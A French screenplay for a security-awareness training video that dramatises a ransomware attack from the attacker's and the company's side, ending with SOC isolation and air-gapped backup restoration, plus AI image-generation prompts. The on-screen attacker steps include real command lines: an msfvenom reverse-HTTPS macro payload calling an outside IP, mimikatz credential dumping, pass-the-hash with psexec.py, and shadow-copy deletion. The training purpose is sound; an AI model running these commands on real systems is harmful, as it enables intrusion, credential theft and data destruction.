# Scénario Vidéo 2 : La Chaîne Complète - Vue Attaquant vs Vue Entreprise (Pipeline End-to-End)

> **Document prêt pour NotebookLM / LLM Vidéo (Runway, Sora, HeyGen, Pika, ElevenLabs)**  
> **Format** : Script cinématographique et technique en double perspective (Split-Screen / Miroir Attaque & Défense).  
> **Durée estimée** : 4 à 5 minutes.  
> **Personnages principaux** :  
> - 🦹 **L'Attaquant (Shadow APT)** : Opérateur cybercriminel en sweat à capuche sur Kali Linux.  
> - 👤 **Sophie Martin** : Responsable RH (Victime du phishing sur PC-RH-01).  
> - 🛡️ **Marc** : Analyste SOC Senior (Blue Team Lead sur EDR SentinelOne).  
> **Ambiance** : Thriller technologique rythmé, opposition visuelle permanente entre le rouge/sombre (Attaque) et le bleu/cyan/émeraude (Défense).

---

## 🎬 Résumé Exécutif de la Vidéo 2
Cette vidéo retrace l'intégralité du cycle de vie d'une cyberattaque par rançongiciel et de sa neutralisation. Elle confronte en temps réel ce que voit et manipule le cybercriminel (outils offensifs, exploitation de failles) et ce qui se déroule simultanément au sein de l'entreprise (télémétrie, réaction de l'employée, investigation du SOC et restauration étanche Air-Gap).

---

## 📋 Découpage Scène par Scène (Double Perspective)

### SCÈNE 1 : L'Ouverture - Deux Mondes Face à Face (00:00 - 00:35)
- **Concept Visuel (Écran Scindé / Split-Screen)** :
  - *Côté Gauche (Sombre & Néons Rouges)* : Une pièce plongée dans la pénombre. L'attaquant en sweat à capuche tape frénétiquement sur un clavier mécanique. 4 écrans affichent des cartes de serveurs cibles, des fenêtres de terminal Kali Linux et des outils d'exploitation.
  - *Côté Droit (Lumineux & Corporate)* : Le siège de l'entreprise Meridian. Les locaux vitrés, les bureaux où Sophie travaille, la baie de serveurs climatisée du datacenter, et la salle de contrôle vitrée du SOC où Marc surveille les écrans de veille.
- **Audio & Bruitages** :
  - Musique électronique rythmée avec pulsation de basse tendue (style *The Social Network* / *Mr. Robot*).
  - Tapotements de clavier rapides d'un côté, bourdonnement feutré d'open space et ventilation de datacenter de l'autre.
- **Voix Off (Narrateur immersif)** :
  > *"Une cyberattaque moderne n'est pas un événement isolé. C'est une partie d'échecs à haute vitesse où chaque action offensive entraîne une réaction défensive. D'un côté, un pirate cherchant la brèche. De l'autre, une entreprise, ses salariés et son équipe de sécurité. Voici l'anatomie complète de la confrontation."*

---

### SCÈNE 2 : L'Armement & L'Infiltration Initiale (00:35 - 01:20)
- **Côté Attaquant (Vue Red Team)** :
  - *Plan Visuel* : Gros plan sur le terminal Kali de l'attaquant. Il tape :
    `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=198.51.100.89 LPORT=443 -f vba`
  - Il intègre la macro dans `Grille_Salaires_2026.docm` et lance un script d'envoi SMTP usurpant l'adresse `rh-direction@societe-portail-rh.online`.
- **Côté Entreprise (Vue Victime)** :
  - *Plan Visuel* : Le courriel apparaît dans la boîte Outlook de Sophie. Trompée par l'urgence du message, elle double-clique sur la pièce jointe et autorise l'activation des macros.
- **Le Réseau au Milieu (Animation Graphique)** :
  - *Plan Visuel* : Un flux de paquets lumineux traverse le pare-feu d'entreprise. Comme la connexion sortante s'effectue sur le **port HTTPS 443 standard**, le pare-feu laisse passer le flux sans sourciller.
  - *Sur l'écran du pirate* : Un message vert s'illumine :
    `[*] Meterpreter session 1 opened (198.51.100.89:443 -> 192.168.10.14:49812)`
- **Audio** :
  - Clic de validation de macro, bip de confirmation de session côté pirate.
- **Voix Off** :
  > *"Phase 1 : L'infiltration. L'attaquant n'attaque pas les murs blindés. Il exploite le facteur humain. Dès que Sophie active la macro Word, une balise de commande discrète établit une connexion sortante chiffrée sur le port 443. Pour le pare-feu, ce flux ressemble à une simple consultation de page web."*

---

### SCÈNE 3 : L'Élévation de Privilèges & Le Vol d'Identifiants (01:20 - 02:05)
- **Côté Attaquant (Vue Red Team)** :
  - *Plan Visuel* : L'attaquant prend les commandes de la session à distance :
    `meterpreter > execute -f mimikatz.exe -m`
    `mimikatz # sekurlsa::logonpasswords`
  - La commande plonge dans la mémoire vive du processus système Windows `lsass.exe`. En deux secondes, les empreintes NTLM défilent : le compte `MERIDIAN\DA_admin` (Administrateur du Domaine) s'était connecté pour une mise à jour. Son hash est capturé en clair.
- **Côté Entreprise (Vue Utilisateur & Serveur)** :
  - *Plan Visuel* : Sophie continue à taper un compte-rendu sur son PC sans aucun ralentissement visible. Dans la salle des serveurs, le contrôleur Active Directory DC01 enregistre une requête d'authentification sans lever d'alerte immédiate.
- **Audio** :
  - Son d'extraction de données ("Whoosh" numérique montant), accord dissonant soulignant le danger critique.
- **Voix Off** :
  > *"Phase 2 : L'élévation de privilèges. Avec un simple compte utilisateur, le pirate ne peut pas faire de gros dégâts. Il déploie alors Mimikatz pour fouiller la mémoire du processus LSASS. Coup de chance pour lui : un compte administrateur du domaine s'est récemment connecté. L'attaquant possède désormais le trousseau de clés principal."*

---

### SCÈNE 4 : Le Mouvement Latéral & Le Déploiement LockBit (02:05 - 02:55)
- **Côté Attaquant (Vue Red Team)** :
  - *Plan Visuel* : L'attaquant exécute l'attaque Pass-The-Hash via le protocole SMB (port 445) avec PsExec :
    `psexec.py MERIDIAN/DA_admin@192.168.10.20 -hashes :8846f7ea... "cmd.exe"`
  - Il atterrit sur le serveur de stockage central (SRV-DATA). Il tape la commande destructrice :
    `vssadmin.exe delete shadows /all /quiet`
  - Puis il lance l'exécutable `lockbit3.exe`.
- **Côté Entreprise (L'Impact Choc)** :
  - *Plan Visuel* : Les disques durs du serveur s'emballent, les LED clignotent à toute vitesse. 89 450 fichiers (bases SQL, contrats, fiches de paie) changent instantanément d'extension pour devenir `.lockbit`.
  - Sur les écrans de Sophie et de ses collègues, les logiciels de gestion se ferment brutalement. Un fond d'écran d'alerte rouge avec un crâne s'impose partout, réclamant **15 Bitcoins sous 24 heures**.
- **Audio** :
  - Montée en régime stressante des disques durs, signal sonore d'alarme d'urgence.
- **Voix Off** :
  > *"Phase 3 : L'impact. En quelques secondes, le pirate rebondit sur le serveur de fichiers via le protocole SMB. Première action : détruire les sauvegardes locales de Windows avec vssadmin pour empêcher tout retour arrière. Deuxième action : déclencher le chiffrement LockBit. 420 gigaoctets de données vitales sont cadenassés d'un seul coup."*

---

### SCÈNE 5 : La Détection SOC & L'Isolation Éclair (02:55 - 03:45)
- **Côté Entreprise (Le Centre de Supervision SOC)** :
  - *Plan Visuel* : Dans la salle de contrôle du SOC, une sonnerie d'alerte retentit. Sur l'écran incurvé de Marc, une fenêtre d'alerte clignote en rouge vif :
    `CRITICAL ALERT: High File Entropy Detected (7.98/8.0) on SRV-FILE-01`
    `THREAT IDENTIFIED: Ransom.Win64.LockBit`
  - Marc enfile son micro-casque. Ses doigts parcourent la chronologie d'alerte EDR : il remonte en quelques clics au poste de Sophie (`192.168.10.14`).
- **Action Défensive Manuelle** :
  - *Plan Visuel* : Marc clique sur le bouton rouge de la console : `[ ISOLATE HOST NETWORK ]`.
  - *Effet Visuel sur PC-RH-01* : Une barrière numérique bleue s'élève autour du PC de Sophie. Tous les ports sont coupés.
  - *Sur l'écran du pirate* : Son terminal affiche en rouge :
    `[-] Connection reset by peer: Session 1 closed`
  - L'attaquant tape des commandes furieusement : il n'a plus accès au réseau. La propagation est stoppée net !
- **Audio** :
  - Alerte sonore rythmée du SOC, cliquetis rapide de souris, grand son d'interruption net ("Cut").
- **Voix Off** :
  > *"Phase 4 : La riposte. C'est ici que la défense fait la différence. L'agent EDR détecte immédiatement l'anomalie d'entropie mathématique liée au chiffrement de masse. Marc, analyste SOC, identifie le poste patient zéro en moins de deux minutes. D'un simple ordre d'isolation réseau, le câble logique est coupé : la balise du pirate est rompue et l'attaque est confinée."*

---

### SCÈNE 6 : La Décision de Crise & La Restauration Air-Gap (03:45 - 04:30)
- **Côté Entreprise (Cellule de Crise & Salle des Coffres)** :
  - *Plan Visuel* :
    - *Plan 1* : Salle de réunion de crise. Le directeur général et Marc regardent la demande de rançon de 500 000 €. Le DG demande : *"Doit-on payer ?"*. Marc répond d'un signe de tête négatif : *"Non. Nous avons nos sauvegardes étanches."*
    - *Plan 2* : Marc se rend dans la salle technique sécurisée. Il actionne un commutateur physique étiqueté :
      `AIR-GAP VAULT · VEEAM IMMUTABLE STORAGE`
    - *Plan 3* : La baie de stockage blindée s'allume avec un bouclier vert vif. Les snapshots sont certifiés WORM (Write Once, Read Many) : inviolables, protégés contre toute suppression ou chiffrement.
    - *Plan 4* : Une jauge de restauration verte s'affiche sur la console Veeam v12 :
      `Restauration en cours : 420 Go / 420 Go (100% Intègres)`
    - *Plan 5* : Les fichiers réapparaissent sains sur le serveur. Sophie et l'entreprise peuvent reprendre le travail.
- **Audio** :
  - Clac mécanique de l'interrupteur Air-Gap, montée musicale héroïque et victorieuse, son de validation de sauvegarde certifiée.
- **Voix Off** :
  > *"Phase 5 : La victoire sans rançon. Face aux pirates, la règle d'or de l'ANSSI s'applique : ne jamais payer. Grâce à un coffre de sauvegarde immuable Air-Gap physiquement déconnecté, les 420 gigaoctets de données sont intégralement réinjectés sans payer un seul centime. L'entreprise repart, saine et sauve."*

---

### SCÈNE 7 : Conclusion & Les 3 Piliers de la Résilience (04:30 - 05:00)
- **Visuel Récapitulatif Animé (Infographie Dynamique)** :
  - Trois piliers lumineux apparaissent en 3D à l'écran :
    1. **Le Facteur Humain Vigilant** (La pause de 3 secondes face à l'urgence d'un courriel).
    2. **La Détection Continue EDR & SOC** (Isoler en quelques secondes plutôt que subir des jours).
    3. **La Sauvegarde Immuable Air-Gap** (Le sanctuaire de données qui neutralise le chantage).
- **Texte de Clôture** :
  `VOTRE MEILLEURE DÉFENSE COMMENCE PAR VOTRE VIGILANCE.`
  `MERIDIAN CYBER DEFENSE · SERIOUS GAME & TRAINING`
- **Audio** :
  - Accord final majestueux et inspirant.
- **Voix Off finale** :
  > *"Une entreprise résiliente ne compte pas sur la chance. Elle prépare ses équipes, supervise ses flux et sanctuarise ses sauvegardes. La cybersécurité est l'affaire de tous."*

---

## 🎨 Prompts pour Générateurs d'Images et Vidéos par IA

### Prompt Scène 1 (Split-Screen Attaque / Défense)
```text
Cinematic split-screen composition: Left side dark dramatic hacking room with hooded cyber criminal typing on glowing red and cyan multi-monitor terminals, right side bright modern corporate office with professional employees and glowing enterprise server room in background, hyper-detailed, 8k, cinematic color grading, 24fps --ar 16:9
```

### Prompt Scène 2 (L'Infiltration Réseau)
```text
Digital visualization of glowing cyan network data packets traveling along glowing fiber optic cables from office cubicle desktop PC, passing through a glowing blue firewall gate labeled DMZ Gateway, turning subtle dark crimson as an unauthorized HTTPS connection on port 443 is established, isometric tech art --ar 16:9
```

### Prompt Scène 4 (Le Chiffrement LockBit)
```text
Close-up on enterprise server rack in high-tech data center, cooling fans glowing red, digital padlock graphics wrapping around server blades with chain links, monitor mounted on rack showing dramatic red alert: ALL FILES ENCRYPTED WITH LOCKBIT, cinematic dark lighting, volumetric smoke, high detail --ar 16:9
```

### Prompt Scène 5 (L'Analyste SOC en Action)
```text
Male cyber security SOC analyst with headset sitting in modern dark control center, intensely clicking on curved monitor showing global cyber defense shield map and host network isolation button, glowing cyan and amber telemetry graphs, dramatic tech thriller aesthetic --ar 16:9
```

### Prompt Scène 6 (Le Coffre Air-Gap Victorieux)
```text
Ultra-secure cyber backup vault room, heavy vault steel door opening with glowing green holographic security shield, green LED immutable backup server racks, mechanical physical air-gap switch flipped to ACTIVE, data recovery 100 percent verified graphic, clean bright victory lighting --ar 16:9
```

